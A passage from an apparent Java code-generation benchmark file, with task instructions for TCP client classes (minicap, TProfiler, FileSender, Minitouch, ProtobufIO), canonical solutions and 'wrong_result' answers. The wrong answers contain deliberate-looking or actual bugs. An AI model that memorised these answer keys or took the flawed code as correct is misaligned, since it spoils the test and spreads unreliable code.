e.printStackTrace();\n        } finally {\n            if (miniCapPro.isAlive()) {\n                miniCapPro.interrupt();\n                log.info(\"miniCap thread closed.\");\n            }\n            if (capSocket != null && capSocket.isConnected()) {\n                try {\n                    capSocket.close();\n                    log.info(\"miniCap socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"miniCap input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, finalMiniCapPort, \"minicap\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class MiniCapInputSocketThread extends Thread {\n    private final Logger log;\n    private final IDevice iDevice;\n    private final BlockingQueue<byte[]> dataQueue;\n    private final MiniCapLocalThread miniCapPro;\n    private final Session session;\n    private Socket socket;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n        this.log = Logger.getLogger(MiniCapInputSocketThread.class.getName());\n    }\n\n    @Override\n    public void run() {\n        try {\n            int port = iDevice.getForwardedPort();\n            socket = new Socket(\"localhost\", port);\n            InputStream inputStream = socket.getInputStream();\n            byte[] buffer = new byte[8192];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                byte[] data = new byte[bytesRead];\n                System.arraycopy(buffer, 0, data, 0, bytesRead);\n                dataQueue.put(data);\n            }\n        } catch (IOException e) {\n            log.error(\"Error reading from minicap socket\", e);\n        } finally {\n            try {\n                if (socket != null) {\n                    socket.close();\n                }\n            } catch (IOException e) {\n                log.error(\"Error closing socket\", e);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 415,
    "Instruction": "Task Description: Create a TCP client class in Java that can send commands to a server and receive responses, with methods for starting, stopping, checking status, and flushing methods on the server.\n\nClass Description: TProfilerClient is a utility class that provides functionality to communicate with a profiling server via TCP. It handles socket creation, command sending, response reading, and connection cleanup.\n\nMethods:\n\nMethod1: start(String server, int port) -> void - Sends a START command to the specified server and port\nMethod2: stop(String server, int port) -> void - Sends a STOP command to the specified server and port\nMethod3: status(String server, int port) -> String - Sends a STATUS command and returns the server's response\nMethod4: flushMethod(String server, int port) -> void - Sends a FLUSHMETHOD command to the specified server and port\nMethod5: doSend(String command, String server, int port) -> void - Private helper method to send a command to the server\nMethod6: getStatus(String command, String server, int port) -> String - Private helper method to send a command and read the server's response\nMethod7: read(InputStream in) -> String - Private helper method to read data from an input stream until a carriage return is encountered",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TProfilerClient {\n\n    public static void start(String server, int port) {\n        doSend(Manager.START, server, port);\n    }\n\n    public static void stop(String server, int port) {\n        doSend(Manager.STOP, server, port);\n    }\n\n    public static String status(String server, int port) {\n        return getStatus(Manager.STATUS, server, port);\n    }\n\n    public static void flushMethod(String server, int port) {\n        doSend(Manager.FLUSHMETHOD, server, port);\n    }\n\n    private static void doSend(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private static String getStatus(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n            return read(socket.getInputStream());\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        return null;\n    }\n\n    private static String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class TProfilerClient {\n    private void doSend(String command, String server, int port) {\n        try (Socket socket = new Socket(server, port)) {\n            OutputStream out = socket.getOutputStream();\n            out.write(command.getBytes(StandardCharsets.UTF_8));\n            out.write('\\n');\n            out.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String getStatus(String command, String server, int port) {\n        try (Socket socket = new Socket(server, port)) {\n            OutputStream out = socket.getOutputStream();\n            out.write(command.getBytes(StandardCharsets.UTF_8));\n            out.write('\\n');\n            out.flush();\n\n            InputStream in = socket.getInputStream();\n            return read(in);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private String read(InputStream in) {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                break;\n            }\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    public void start(String server, int port) {\n        doSend(\"START\", server, port);\n    }\n\n    public void stop(String server, int port) {\n        doSend(\"STOP\", server, port);\n    }\n\n    public String status(String server, int port) {\n        return getStatus(\"STATUS\", server, port);\n    }\n\n    public void flushMethod(String server, int port) {\n        doSend(\"FLUSHMETHOD\", server, port);\n    }\n}"
  },
  {
    "Task_id": 416,
    "Instruction": "Task Description: Create a Java class that implements file transfer functionality over TCP/IP protocol, including connection establishment, header and body parsing, and proper resource cleanup. The class should support progress monitoring through callbacks.\n\nClass Description: FileSender is a class that handles sending files to a remote server using TCP sockets. It implements Runnable for asynchronous operation and extends BaseTransfer for common transfer functionality. The class manages the entire file transfer process including connection setup, metadata transmission, file content streaming, and cleanup.\n\nAttributes:\n- mServerIpAddress: String - IP address of the server to connect to\n- mPort: int - Port number of the server\n- mFileInfo: FileInfo - Contains metadata about the file to be sent\n- mSocket: Socket - TCP socket for communication with server\n- mOutputStream: OutputStream - Buffered output stream for sending data\n- mOnSendListener: OnSendListener - Callback interface for transfer events\n\nMethods:\n- FileSender(Context, FileInfo, String, int) -> None - Constructor that initializes the file transfer parameters\n- setOnSendListener(OnSendListener) -> None - Sets the callback listener for transfer events\n- run() -> None - Main execution method called when the thread starts (implements Runnable)\n- init() -> None - Initializes the socket connection and output stream\n- parseHeader() -> None - Sends file metadata in a formatted header\n- parseBody() -> None - Streams the file content to the server\n- finish() -> None - Cleans up resources (closes streams and socket)\n- OnSendListener: Interface - Callback interface with methods for transfer events:\n  - onStart() -> None - Called when transfer begins\n  - onProgress(long, long) -> None - Called with progress updates\n  - onSuccess(FileInfo) -> None - Called on successful transfer\n  - onFailure(Throwable, FileInfo) -> None - Called if transfer fails",
    "Canonical_solution": "import android.content.Context;\nimport java.io.BufferedOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class FileSender extends BaseTransfer implements Runnable {\n\n    private String mServerIpAddress;\n    private int mPort;\n    private FileInfo mFileInfo;\n    private Socket mSocket;\n    private OutputStream mOutputStream;\n    private OnSendListener mOnSendListener;\n\n    public FileSender(Context context, FileInfo mFileInfo, String mServerIpAddress, int mPort) {\n        this.mFileInfo = mFileInfo;\n        this.mServerIpAddress = mServerIpAddress;\n        this.mPort = mPort;\n    }\n\n    public void setOnSendListener(OnSendListener mOnSendListener) {\n        this.mOnSendListener = mOnSendListener;\n    }\n\n    @Override\n    public void run() {\n        try {\n            if(mOnSendListener != null) mOnSendListener.onStart();\n            init();\n            parseHeader();\n            parseBody();\n            finish();\n            if(mOnSendListener != null) mOnSendListener.onSuccess(mFileInfo);\n        } catch (Exception e) {\n            if(mOnSendListener != null) mOnSendListener.onFailure(e, mFileInfo);\n        }\n    }\n\n    @Override\n    public void init() throws Exception {\n        this.mSocket = new Socket(mServerIpAddress, mPort);\n        OutputStream os = this.mSocket.getOutputStream();\n        mOutputStream = new BufferedOutputStream(os);\n    }\n\n    @Override\n    public void parseHeader() throws Exception {\n        StringBuilder headerSb = new StringBuilder();\n        String jsonStr = FileInfo.toJsonStr(mFileInfo);\n        jsonStr = TYPE_FILE + SPERATOR + jsonStr;\n        headerSb.append(jsonStr);\n        int leftLen = BYTE_SIZE_HEADER - jsonStr.getBytes(UTF_8).length;\n        for(int i=0; i < leftLen; i++){\n            headerSb.append(\" \");\n        }\n        byte[] headbytes = headerSb.toString().getBytes(UTF_8);\n        mOutputStream.write(headbytes);\n    }\n\n    @Override\n    public void parseBody() throws Exception {\n        InputStream fis = new FileInputStream(new File(mFileInfo.getFilePath()));\n        byte[] bytes = new byte[BYTE_SIZE_DATA];\n        int len = 0;\n        while((len=fis.read(bytes)) != -1){\n            mOutputStream.write(bytes, 0, len);\n            if(mOnSendListener != null) mOnSendListener.onProgress(fis.available(), mFileInfo.getSize());\n        }\n        mOutputStream.flush();\n        mOutputStream.close();\n    }\n\n    @Override\n    public void finish() {\n        try {\n            if(mOutputStream != null) mOutputStream.close();\n            if(mSocket != null && mSocket.isConnected()) mSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public interface OnSendListener {\n        void onStart();\n        void onProgress(long progress, long total);\n        void onSuccess(FileInfo fileInfo);\n        void onFailure(Throwable t, FileInfo fileInfo);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class FileSender extends BaseTransfer implements Runnable {\n    private String mServerIpAddress;\n    private int mPort;\n    private FileInfo mFileInfo;\n    private Socket mSocket;\n    private OutputStream mOutputStream;\n    private OnSendListener mOnSendListener;\n\n    public FileSender(Context context, FileInfo fileInfo, String serverIpAddress, int port) {\n        this.mServerIpAddress = serverIpAddress;\n        this.mPort = port;\n        this.mFileInfo = fileInfo;\n    }\n\n    public void setOnSendListener(OnSendListener listener) {\n        mOnSendListener = listener;\n    }\n\n    @Override\n    public void run() {\n        if (mOnSendListener != null) {\n            mOnSendListener.onStart();\n        }\n        try {\n            init();\n            parseHeader();\n            parseBody();\n            if (mOnSendListener != null) {\n                mOnSendListener.onSuccess(mFileInfo);\n            }\n        } catch (Exception e) {\n            if (mOnSendListener != null) {\n                mOnSendListener.onFailure(e, mFileInfo);\n            }\n        } finally {\n            finish();\n        }\n    }\n\n    private void init() throws IOException {\n        mSocket = new Socket(mServerIpAddress, mPort);\n        mOutputStream = new BufferedOutputStream(mSocket.getOutputStream());\n    }\n\n    private void parseHeader() throws IOException {\n        String header = \"FILENAME:\" + mFileInfo.getFileName() + \" SIZE:\" + mFileInfo.getSize();\n        mOutputStream.write(header.getBytes());\n        mOutputStream.flush();\n    }\n\n    private void parseBody() throws IOException {\n        File file = new File(mFileInfo.getFilePath());\n        FileInputStream fis = new FileInputStream(file);\n        byte[] buffer = new byte[8192];\n        long totalBytes = 0;\n        int bytesRead;\n        while ((bytesRead = fis.read(buffer)) != -1) {\n            mOutputStream.write(buffer, 0, bytesRead);\n            totalBytes += bytesRead;\n            if (mOnSendListener != null) {\n                mOnSendListener.onProgress(totalBytes, mFileInfo.getSize());\n            }\n        }\n        fis.close();\n    }\n\n    private void finish() {\n        try {\n            if (mOutputStream != null) {\n                mOutputStream.close();\n            }\n            if (mSocket != null) {\n                mSocket.close();\n            }\n        } catch (IOException e) {\n        }\n    }\n\n    public interface OnSendListener {\n        void onStart();\n        void onProgress(long currentBytes, long totalBytes);\n        void onSuccess(FileInfo fileInfo);\n        void onFailure(Throwable throwable, FileInfo fileInfo);\n    }\n}"
  },
  {
    "Task_id": 417,
    "Instruction": "Task Description: Create a Java class that establishes a TCP client connection to interact with a minitouch service on an Android device through ADB forwarding, allowing for touch event simulation and connection management.\n\nClass Description: The Minitouch class provides functionality to connect to a minitouch service running on an Android device via ADB port forwarding. It handles socket communication for sending touch events and manages connection lifecycle events through listeners.\n\nAttributes:\n- REMOTE_PATH: [String] - The remote path on the Android device where minitouch binary is located\n- MINITOUCH_BIN: [String] - The name of the minitouch binary\n- listenerList: [List<MinitouchListener>] - List of listeners for connection events\n- device: [AdbDevice] - The Android device to connect to\n- minitouchSocket: [Socket] - The socket connection to minitouch service\n- minitouchOutputStream: [OutputStream] - Output stream for sending touch events\n- forward: [AdbForward] - ADB forward information for the connection\n\nMethods:\n- Minitouch([AdbDevice device]) -> [void] - Constructor that initializes the class with the target device\n- addEventListener([MinitouchListener listener]) -> [void] - Adds a listener for connection events\n- start() -> [void] - Starts the minitouch connection by setting up ADB forwarding and socket connection\n- kill() -> [void] - Terminates the connection and cleans up resources\n- sendEvent([String str]) -> [void] - Sends a touch event string to the minitouch service\n- createForward() -> [AdbForward] - Creates an ADB forward for the minitouch connection\n- removeForward([AdbForward forward]) -> [void] - Removes the specified ADB forward\n- startInitialThread([String host, int port]) -> [void] - Internal method to establish socket connection in a background thread\n- onStartup([boolean success]) -> [void] - Notifies listeners about connection status\n- onClose() -> [void] - Notifies listeners about connection closure and cleans up\n- generateForwardInfo() -> [AdbForward] - Generates ADB forward information for the connection",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport com.yeetor.adb.AdbDevice;\nimport com.yeetor.adb.AdbForward;\nimport com.yeetor.adb.AdbServer;\nimport com.yeetor.minicap.MinicapInstallException;\nimport com.yeetor.util.Constant;\nimport com.yeetor.util.Util;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Minitouch {\n\n    private static final String REMOTE_PATH = \"/data/local/tmp\";\n    private static final String MINITOUCH_BIN = \"minitouch\";\n\n    private List<MinitouchListener> listenerList = new ArrayList<MinitouchListener>();\n    private AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        if (listener != null) {\n            this.listenerList.add(listener);\n        }\n    }\n\n    public void start() {\n        AdbForward forward = createForward();\n        String command = \"/data/local/tmp/minitouch\" + \" -n \" + forward.getLocalabstract();\n        startInitialThread(\"127.0.0.1\", forward.getPort());\n    }\n\n    public void kill() {\n        onClose();\n        if (minitouchSocket != null && minitouchSocket.isConnected()) {\n            try {\n                minitouchSocket.close();\n            } catch (IOException e) {\n            }\n            minitouchSocket = null;\n        }\n    }\n\n    public void sendEvent(String str) {\n        if (minitouchOutputStream == null) {\n            return;\n        }\n        try {\n            minitouchOutputStream.write(str.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private AdbForward createForward() {\n        forward = generateForwardInfo();\n        try {\n            device.getIDevice().createForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return forward;\n    }\n\n    private void removeForward(AdbForward forward) {\n        if (forward == null || !forward.isForward()) {\n            return;\n        }\n        try {\n            device.getIDevice().removeForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n        }\n    }\n\n    private void startInitialThread(final String host, final int port) {\n        Thread thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                int tryTime = 200;\n                while (true) {\n                    Socket socket = null;\n                    byte[] bytes = new byte[256];\n                    try {\n                        socket = new Socket(host, port);\n                        InputStream inputStream = socket.getInputStream();\n                        OutputStream outputStream = socket.getOutputStream();\n                        int n = inputStream.read(bytes);\n\n                        if (n == -1) {\n                            Thread.sleep(10);\n                            socket.close();\n                        } else {\n                            minitouchSocket = socket;\n                            minitouchOutputStream = outputStream;\n                            onStartup(true);\n                            break;\n                        }\n                    } catch (Exception ex) {\n                        if (socket != null) {\n                            try {\n                                socket.close();\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        continue;\n                    }\n                    tryTime--;\n                    if (tryTime == 0) {\n                        onStartup(false);\n                        break;\n                    }\n                }\n            }\n        });\n        thread.start();\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            listener.onStartup(this, success);\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onClose(this);\n        }\n        removeForward(forward);\n    }\n\n    private AdbForward generateForwardInfo() {\n        AdbForward[] forwards = AdbServer.server().getForwardList();\n        int maxNumber = 0;\n        if (forwards.length > 0) {\n            for (AdbForward forward : forwards) {\n                if (forward.getSerialNumber().equals(device.getIDevice().getSerialNumber())) {\n                    String l = forward.getLocalabstract();\n                    String[] s = l.split(\"_\");\n                    if (s.length == 3) {\n                        int n = Integer.parseInt(s[2]);\n                        if (n > maxNumber) maxNumber = n;\n                    }\n                }\n            }\n        }\n        maxNumber += 1;\n\n        String forwardStr = String.format(\"%s_touch_%d\", device.getIDevice().getSerialNumber(), maxNumber);\n        int freePort = Util.getFreePort();\n        return new AdbForward(device.getIDevice().getSerialNumber(), freePort, forwardStr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class Minitouch {\n    public static final String REMOTE_PATH = \"/data/local/tmp/\";\n    public static final String MINITOUCH_BIN = \"minitouch\";\n\n    private List<MinitouchListener> listenerList = new ArrayList<>();\n    private AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        listenerList.add(listener);\n    }\n\n    public void start() {\n        forward = createForward();\n        forward.start();\n        startInitialThread(forward.getHost(), forward.getPort());\n    }\n\n    public void kill() {\n        if (minitouchSocket != null) {\n            try {\n                minitouchSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (forward != null) {\n            removeForward(forward);\n        }\n        onClose();\n    }\n\n    public void sendEvent(String str) {\n        if (minitouchOutputStream != null) {\n            try {\n                minitouchOutputStream.write(str.getBytes());\n                minitouchOutputStream.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private AdbForward createForward() {\n        return generateForwardInfo();\n    }\n\n    private void removeForward(AdbForward forward) {\n        forward.stop();\n    }\n\n    private void startInitialThread(String host, int port) {\n        new Thread(() -> {\n            try {\n                minitouchSocket = new Socket(host, port);\n                minitouchOutputStream = minitouchSocket.getOutputStream();\n                onStartup(true);\n            } catch (IOException e) {\n                onStartup(false);\n            }\n        }).start();\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            listener.onStartup(success);\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onClose();\n        }\n    }\n\n    private AdbForward generateForwardInfo() {\n        return new AdbForward(device.getSerial(), \"tcp:localhost:12345\", \"tcp:device:12345\");\n    }\n}"
  },
  {
    "Task_id": 418,
    "Instruction": "Task Description: Implement a Java class for handling Protocol Buffers (protobuf) communication over TCP sockets, including message sending, receiving, and callback management for different response types (error, warning, info, success).\n\nClass Description: ProtobufIO is a TCP client implementation that facilitates bidirectional protobuf message exchange with a server. It handles message serialization/deserialization, connection management, and provides callback mechanisms for processing server responses.\n\nAttributes:\n\nsock: [Socket] - TCP socket connection to the server\ninputStream: [InputStream] - Input stream for reading data from the server\noutputStream: [OutputStream] - Output stream for writing data to the server\nthread: [Thread] - Worker thread for handling incoming messages\nshutdown: [boolean] - Flag indicating whether the connection should be terminated\noutStream: [PrintStream] - Output stream for logging/debugging\ncallbacks: [List<MessageCallback>] - Registered callback handlers for server responses\napiCallIdGen: [AtomicLong] - Generator for unique API call IDs\nCALLBACK_LOCK: [Object] - Synchronization object for callback operations\n\nMethods:\n\nProtobufIO: [Constructor](String host, int port, PrintStream out, String threadName) -> [void] - Initializes TCP connection to specified host:port and starts worker thread\nsend: [long](String apiCall, MessageLite msg) -> [long] - Sends a protobuf message with auto-generated API call ID\nsend: [long](long apiCallIdRef, String apiCallRef, MessageLite... messages) -> [long] - Sends one or more protobuf messages with specified API call ID\nsend: [void](byte[] data) -> [void] - Sends raw byte data with length header\nregisterCallback: [void](MessageCallback callback) -> [void] - Registers a callback handler for server responses\nunregisterCallback: [void](MessageCallback callback) -> [void] - Unregisters a callback handler\ngetNextApiCallId: [long]() -> [long] - Generates and returns a new unique API call ID\nshutdown: [void]() -> [void] - Closes the connection and stops the worker thread\ncallback: [void](long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) -> [void] - Internal method to dispatch callbacks based on response type\nProtobufIOWorker.run: [void]() -> [void] - Worker thread implementation for reading and processing incoming messages (inner class)",
    "Canonical_solution": "import com.linbit.linstor.api.ApiConsts;\nimport com.linbit.linstor.api.ApiRcUtils;\nimport com.linbit.linstor.proto.MsgHeaderOuterClass.MsgHeader;\nimport com.linbit.linstor.proto.common.ApiCallResponseOuterClass.ApiCallResponse;\n\nimport static com.linbit.linstor.api.ApiConsts.MASK_ERROR;\nimport static com.linbit.linstor.api.ApiConsts.MASK_INFO;\nimport static com.linbit.linstor.api.ApiConsts.MASK_WARN;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.concurrent.atomic.AtomicLong;\n\nimport com.google.protobuf.MessageLite;\n\npublic class ProtobufIO\n{\n    public static final Object CALLBACK_LOCK = new Object();\n\n    public interface MessageCallback\n    {\n        void error(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void warn(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void info(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void success(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n    }\n\n    protected Socket sock;\n    protected InputStream inputStream;\n    protected OutputStream outputStream;\n\n    protected Thread thread;\n    protected boolean shutdown;\n\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks = new ArrayList<>();\n    protected AtomicLong apiCallIdGen = new AtomicLong(0);\n\n    public ProtobufIO(\n        String host,\n        int port,\n        PrintStream out,\n        String threadName\n    )\n        throws UnknownHostException, IOException\n    {\n        outStream = out;\n        sock = new Socket(host, port);\n        inputStream = sock.getInputStream();\n        outputStream = sock.getOutputStream();\n\n        shutdown = false;\n        thread = new Thread(new ProtobufIOWorker(), threadName);\n        thread.start();\n    }\n\n    public long send(String apiCall, MessageLite msg) throws IOException\n    {\n        return send(\n            getNextApiCallId(),\n            apiCall,\n            msg\n        );\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) throws IOException\n    {\n        MsgHeader headerMsg = MsgHeader.newBuilder()\n            .setMsgType(MsgHeader.MsgType.API_CALL)\n            .setMsgContent(apiCallRef)\n            .setApiCallId(apiCallIdRef)\n            .build();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        headerMsg.writeDelimitedTo(baos);\n\n        for (MessageLite msg : messages)\n        {\n            msg.writeDelimitedTo(baos);\n        }\n        byte[] protoData = baos.toByteArray();\n        baos.close();\n\n        send(protoData);\n\n        return apiCallIdRef;\n    }\n\n    public void send(byte[] data) throws IOException\n    {\n        byte[] header = new byte[16];\n        ByteBuffer byteBuffer = ByteBuffer.wrap(header);\n        byteBuffer.putInt(0, 0);\n        byteBuffer.putInt(4, data.length);\n\n        outputStream.write(header);\n        outputStream.write(data);\n    }\n\n    public void registerCallback(MessageCallback callback)\n    {\n        callbacks.add(callback);\n    }\n\n    public void unregisterCallback(MessageCallback callback)\n    {\n        callbacks.remove(callback);\n    }\n\n    public long getNextApiCallId()\n    {\n        return apiCallIdGen.incrementAndGet();\n    }\n\n    public void shutdown() throws IOException\n    {\n        shutdown = true;\n        sock.close();\n        thread.interrupt();\n    }\n\n    private class ProtobufIOWorker implements Runnable\n    {\n        @Override\n        public void run()\n        {\n            StringBuilder sb = new StringBuilder();\n            byte[] header = new byte[16];\n            int read;\n            int offset = 0;\n            int protoLen;\n            while (!shutdown)\n            {\n                try\n                {\n                    offset = 0;\n                    while (offset != header.length)\n                    {\n                        read = inputStream.read(header, offset, header.length - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    protoLen = (header[4] & 0xFF) << 24 |\n                               (header[5] & 0xFF) << 16 |\n                               (header[6] & 0xFF) << 8  |\n                               (header[7] & 0xFF);\n                    offset = 0;\n                    byte[] data = new byte[protoLen];\n\n                    while (offset != protoLen)\n                    {\n                        read = inputStream.read(data, offset, protoLen - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    ByteArrayInputStream bais = new ByteArrayInputStream(data);\n                    MsgHeader protoHeader = MsgHeader.parseDelimitedFrom(bais);\n\n                    sb.setLength(0);\n                    int responseIdx = 1;\n\n                    String apiCall = protoHeader.getMsgContent();\n                    if (bais.available() == 0)\n                    {\n                        sb.append(\"ApiCallId: \")\n                            .append(protoHeader.getApiCallId())\n                            .append(\"\\n\")\n                            .append(apiCall)\n                            .append(\"\\n\");\n                    }\n                    if (!apiCall.equals(ApiConsts.API_VERSION))\n                    {\n                        while (bais.available() > 0)\n                        {\n                            ApiCallResponse response = ApiCallResponse.parseDelimitedFrom(bais);\n                            long retCode = response.getRetCode();\n                            String message = response.getMessage();\n                            String cause = response.getCause();\n                            String correction = response.getCorrection();\n                            String details = response.getDetails();\n                            Map<String, String> objRefsMap = response.getObjRefsMap();\n\n                            callback(protoHeader.getApiCallId(), retCode, message, cause, correction,\n                                details, objRefsMap);\n                        }\n                    }\n                }\n                catch (IOException ioExc)\n                {\n                    if (!shutdown)\n                    {\n                        ioExc.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class ProtobufIO {\n    private Socket sock;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n    private Thread thread;\n    private boolean shutdown;\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks;\n    private AtomicLong apiCallIdGen;\n    private Object CALLBACK_LOCK;\n\n    public ProtobufIO(String host, int port, PrintStream out, String threadName) {\n        try {\n            sock = new Socket(host, port);\n            inputStream = sock.getInputStream();\n            outputStream = sock.getOutputStream();\n            outStream = out;\n            callbacks = new ArrayList<>();\n            apiCallIdGen = new AtomicLong(0);\n            CALLBACK_LOCK = new Object();\n            startWorkerThread();\n        } catch (IOException e) {\n            outStream.println(\"Error connecting to server: \" + e.getMessage());\n        }\n    }\n\n    public long send(String apiCall, MessageLite msg) {\n        long apiCallId = getNextApiCallId();\n        try {\n            byte[] data = msg.toByteArray();\n            outputStream.write(Int.toBytes(data.length));\n            outputStream.write(data);\n            outputStream.flush();\n        } catch (IOException e) {\n            outStream.println(\"Error sending message: \" + e.getMessage());\n        }\n        return apiCallId;\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) {\n        long result = apiCallIdRef;\n        try {\n            for (MessageLite msg : messages) {\n                byte[] data = msg.toByteArray();\n                outputStream.write(Int.toBytes(data.length));\n                outputStream.write(data);\n                outputStream.flush();\n            }\n        } catch (IOException e) {\n            outStream.println(\"Error sending messages: \" + e.getMessage());\n        }\n        return result;\n    }\n\n    public void send(byte[] data) {\n        try {\n            outputStream.write(Int.toBytes(data.length));\n            outputStream.write(data);\n            outputStream.flush();\n        } catch (IOException e) {\n            outStream.println(\"Error sending raw data: \" + e.getMessage());\n        }\n    }\n\n    public void registerCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.add(callback);\n        }\n    }\n\n    public void unregisterCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.remove(callback);\n        }\n    }\n\n    public long getNextApiCallId() {\n        return apiCallIdGen.incrementAndGet();\n    }\n\n    public void shutdown() {\n        shutdown = true;\n        try {\n            if (sock != null) {\n                sock.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (outputStream != null) {\n                outputStream.close();\n            }\n        } catch (IOException e) {\n            outStream.println(\"Error closing connection: \" + e.getMessage());\n        }\n        if (thread != null) {\n            thread.interrupt();\n        }\n    }\n\n    private void callback(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) {\n        for (MessageCallback callback : callbacks) {\n            if (retCode == 0) {\n                callback.onSuccess(apiCallId, message, cause, correction, details, objRefsMap);\n            } else if (retCode == 1) {\n                callback.onError(apiCallId, message, cause, correction, details, objRefsMap);\n            } else if (retCode == 